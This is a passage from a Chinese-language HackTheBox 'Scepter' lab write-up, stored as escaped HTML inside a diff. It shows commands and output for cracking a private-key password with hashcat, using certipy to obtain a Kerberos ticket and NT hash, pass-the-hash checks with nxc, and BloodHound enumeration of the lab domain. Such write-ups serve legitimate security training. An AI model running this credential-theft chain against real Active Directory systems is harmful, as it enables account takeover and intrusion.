+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod: changing permissions of &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;: Permission denied
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;baker.crt  baker.key  clark.pfx  hostname  krb5.conf  lewis.pfx  scott.pfx  start.sh  test
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只有baker提供了key文件，所以先爆破他&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat baker.hash 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$PEM$1$4$d7b39fa5d2d1d06153a95e1d2a80de86$2048$472edaace794795742a020c4e126cdd4$1232$1e3ebe95baabe7041737c3aac5ee7b879bee03c8a121c22d7bf8290d1367233bcb0ef990de04ab244e75774138561cf1712607e379b75fae0643c9a41123aea0a879261c17e7ebd61ef6ca335f24a267e95f830785ed09c1b968f0385cde3d814ae851a18a46f6627049d013605c319589d6179e3df5b0c71a43e738f911d3c0bf151c96d50849ab230634b9c9f48c655b2498f859bfd1140ecaee214b4bbcece2e88255bd3888437eeeabcf441d0d622cfb5750c6bc046ba38174bfaadfc3522ba1f6701a290984edc86c3f3a4ce5e7e2eb9f8d756b61dda53f098d78a74cd64cb67f61c30e9432aa8c518cd71bacdf050fef4a8bad216d3f5a48396f80552bfc16fc4161eaf701956564d02757cfc91272c5b1eca178e32a8a4cdfda5867ef631d83596d7b706cd4b0ebc0996d4e5e0bb6601615023b3abdb5d8cc9caacd328896c48a9a73fec336a8c6002c4ff42d1001e9a4c0c85b48c40e9603711bd18b9fff123a5d6f3dd7113bc45c58f5384a56570593c5948cb62123091254fdbb6246c5e8075a759af1c40354723be5d7f77c97e5645b15407ee6df6df17ad50ac52dd497c535d55a982e018730089c582eb7be0d88843bbdb7b73a536cb1ed195ad7f0a1fe26cdbe14d5eedd09f7c3d08a0a5cbc5986ccdd09abdef1e35a1d88ba37bc0ee4072d369e47850161b6881349ef7d3479c4e35cd11d371e8ec16c5104bf9a9cee6d45e3686913b79b8f4495eec39fa3731a593af5ca6faa8374951209afce7787c6826406b5a281aff5c8722420fcaf7a0815076b2a7a59c05c030b5365e51024cfd5fea85e1ed8a9b098ee2737818b7e488ada5a7db95caca3129ad20a13def66f97c35f435d9c3092acd65e4d73580b804ddbeb7887540fd617965368dfccd2c0703a03f9a52ba56fc90841b033339ee8c4c273f87734260e70fbdc7372f6d305ceb583a3a7a8330dda76265896fa7e905319bb7c9a3f014b46192927ce267755b31c7ea0b8bdb3f2f3c7767c7b7d4169883a68e9329c1939ba2d03cacca60e35171b1742af66a99cb4f2da6917a4f40ddc1803cb2889ce126cca5402eb80cfd5894702ad1f0946a0936d06b2dfad52ac5273bf1466690ce63221108132533223abb62cf2d5911209c7eb5a8d0864ce17d399dc7a09052679a254db02fdd9f6358ea4de45c9b64fbd13547299936b2971a1a9955711816745033e762473427d58c27c9e9d45b54fc5b482daf1cdfd825af0b71003444680ac68875b110bfdc71c5433c2d27fc67a7f764e18b27b6b50e82bf3f99c8d8a9087b5aa4731c5606fd5136229cb75d3ea238d8b6de08220163fd2957b471170f4b08cde05cd01fe7d7deb7f5c7c61c408f54ae272ac48d8833743d74391984ccf8ca34ad3b65c6a4ea39a1d022393c926fdb5f96f2993a0817299135128ee51e95987cab7b6da42550415bd91b2503426306d27c7dd26a7475b5fbcde8f10378009b58a8d0c1e9d1dac4c9b01bb2f55a708ca1f6c60f194af9b76c82bdc16a95edd27ebe25703a892ee2f09c184e50e9e546174d3f3b7d419e8cd057842b09383649190c558f197924c86668b6ef14d5b46030197bc5a75fb2ec629ed7f9a8db73784e488214d493ae7eb19643156f92815d5dc4411bd2f5e54c2cae97f3af6080e49de444c071b994278c9f74c964f02855148f7a73086d96cab68d267e388e8dec149ce8521c9429461f9f694cb67c0ebf0fff0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;hashcat的24420模式与他类似，需要将$PEM$1改为$PEM$2进行爆破&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat baker.hash rockyou.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v6.2.6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; starting in autodetect mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;snip&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The following mode was auto-detected as the only one matching your input hash:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24420&lt;/span&gt; | PKCS#8 Private Keys &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;PBKDF2-HMAC-SHA256 + 3DES/AES&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; | Private Key
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;snip&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$PEM$2$4$d7b39fa5d2d1d06153a95e1d2a80de86$2048$472edaace794795742a020c4e126cdd4$1232$1e3ebe95baabe7041737c3aac5ee7b879bee03c8a121c22d7bf8290d1367233bcb0ef990de04ab244e75774138561cf1712607e379b75fae0643c9a41123aea0a879261c17e7ebd61ef6ca335f24a267e95f830785ed09c1b968f0385cde3d814ae851a18a46f6627049d013605c319589d6179e3df5b0c71a43e738f911d3c0bf151c96d50849ab230634b9c9f48c655b2498f859bfd1140ecaee214b4bbcece2e88255bd3888437eeeabcf441d0d622cfb5750c6bc046ba38174bfaadfc3522ba1f6701a290984edc86c3f3a4ce5e7e2eb9f8d756b61dda53f098d78a74cd64cb67f61c30e9432aa8c518cd71bacdf050fef4a8bad216d3f5a48396f80552bfc16fc4161eaf701956564d02757cfc91272c5b1eca178e32a8a4cdfda5867ef631d83596d7b706cd4b0ebc0996d4e5e0bb6601615023b3abdb5d8cc9caacd328896c48a9a73fec336a8c6002c4ff42d1001e9a4c0c85b48c40e9603711bd18b9fff123a5d6f3dd7113bc45c58f5384a56570593c5948cb62123091254fdbb6246c5e8075a759af1c40354723be5d7f77c97e5645b15407ee6df6df17ad50ac52dd497c535d55a982e018730089c582eb7be0d88843bbdb7b73a536cb1ed195ad7f0a1fe26cdbe14d5eedd09f7c3d08a0a5cbc5986ccdd09abdef1e35a1d88ba37bc0ee4072d369e47850161b6881349ef7d3479c4e35cd11d371e8ec16c5104bf9a9cee6d45e3686913b79b8f4495eec39fa3731a593af5ca6faa8374951209afce7787c6826406b5a281aff5c8722420fcaf7a0815076b2a7a59c05c030b5365e51024cfd5fea85e1ed8a9b098ee2737818b7e488ada5a7db95caca3129ad20a13def66f97c35f435d9c3092acd65e4d73580b804ddbeb7887540fd617965368dfccd2c0703a03f9a52ba56fc90841b033339ee8c4c273f87734260e70fbdc7372f6d305ceb583a3a7a8330dda76265896fa7e905319bb7c9a3f014b46192927ce267755b31c7ea0b8bdb3f2f3c7767c7b7d4169883a68e9329c1939ba2d03cacca60e35171b1742af66a99cb4f2da6917a4f40ddc1803cb2889ce126cca5402eb80cfd5894702ad1f0946a0936d06b2dfad52ac5273bf1466690ce63221108132533223abb62cf2d5911209c7eb5a8d0864ce17d399dc7a09052679a254db02fdd9f6358ea4de45c9b64fbd13547299936b2971a1a9955711816745033e762473427d58c27c9e9d45b54fc5b482daf1cdfd825af0b71003444680ac68875b110bfdc71c5433c2d27fc67a7f764e18b27b6b50e82bf3f99c8d8a9087b5aa4731c5606fd5136229cb75d3ea238d8b6de08220163fd2957b471170f4b08cde05cd01fe7d7deb7f5c7c61c408f54ae272ac48d8833743d74391984ccf8ca34ad3b65c6a4ea39a1d022393c926fdb5f96f2993a0817299135128ee51e95987cab7b6da42550415bd91b2503426306d27c7dd26a7475b5fbcde8f10378009b58a8d0c1e9d1dac4c9b01bb2f55a708ca1f6c60f194af9b76c82bdc16a95edd27ebe25703a892ee2f09c184e50e9e546174d3f3b7d419e8cd057842b09383649190c558f197924c86668b6ef14d5b46030197bc5a75fb2ec629ed7f9a8db73784e488214d493ae7eb19643156f92815d5dc4411bd2f5e54c2cae97f3af6080e49de444c071b994278c9f74c964f02855148f7a73086d96cab68d267e388e8dec149ce8521c9429461f9f694cb67c0ebf0fff0:newpassword
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;snip&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到密码newpassword&lt;/p&gt;
+&lt;p&gt;用这个密码为baker创建证书，可以正常请求hash（其他证书我试过了，并不可以请求）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ openssl pkcs12 -export -inkey baker.key -in baker.crt -out baker.pfx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Enter pass phrase &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; baker.key:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Enter Export Password:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Verifying - Enter Export Password:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;baker.crt  baker.hash  baker.key  baker.pfx  clark.pfx	hostname  krb5.conf  lewis.pfx	scott.pfx  start.sh  test
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ certipy auth -pfx baker.pfx -dc-ip $ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certipy v5.0.3 - by Oliver Lyak &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ly4k&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Certificate identities:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     SAN UPN: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker@scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     Security Extension SID: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;S-1-5-21-74879546-916818434-740295365-1106&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Using principal: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker@scepter.htb&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying to get TGT...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got TGT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Saving credential cache to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Wrote credential cache to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker.ccache&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying to retrieve NT hash &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Got hash &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d.baker@scepter.htb&amp;#39;&lt;/span&gt;: aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到新用户&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ echo user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;d.baker&amp;gt;&amp;gt;start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ echo hash&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;18b5fb0d99e7a475316213c15b6f22ce&amp;gt;&amp;gt;start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ . start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc winrm $ip -u $user -H $hash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; / Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC01&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:scepter.htb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;.baker:18b5fb0d99e7a475316213c15b6f22ce
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ nxc smb $ip -u $user -H $hash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; / Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:DC01&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domin:scepter.htb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Null Auth:True&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SMB         10.129.103.0    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    DC01             &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; scepter.htb&lt;span style=&#34;color:#ae81ff&#34;&gt;\d&lt;/span&gt;.baker:18b5fb0d99e7a475316213c15b6f22ce 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;没有winrm权限，抓猎犬&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ bloodhound-python -d $domain -c ALL -u $user --hashes :$hash -ns $ip --zip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: BloodHound.py &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; BloodHound LEGACY &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BloodHound 4.2 and 4.3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found AD domain: scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Getting TGT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; bytes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Connecting to LDAP server: dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; domains
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; domains in the forest
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; computers
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Connecting to LDAP server: dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; users
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INFO: Found &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; groups
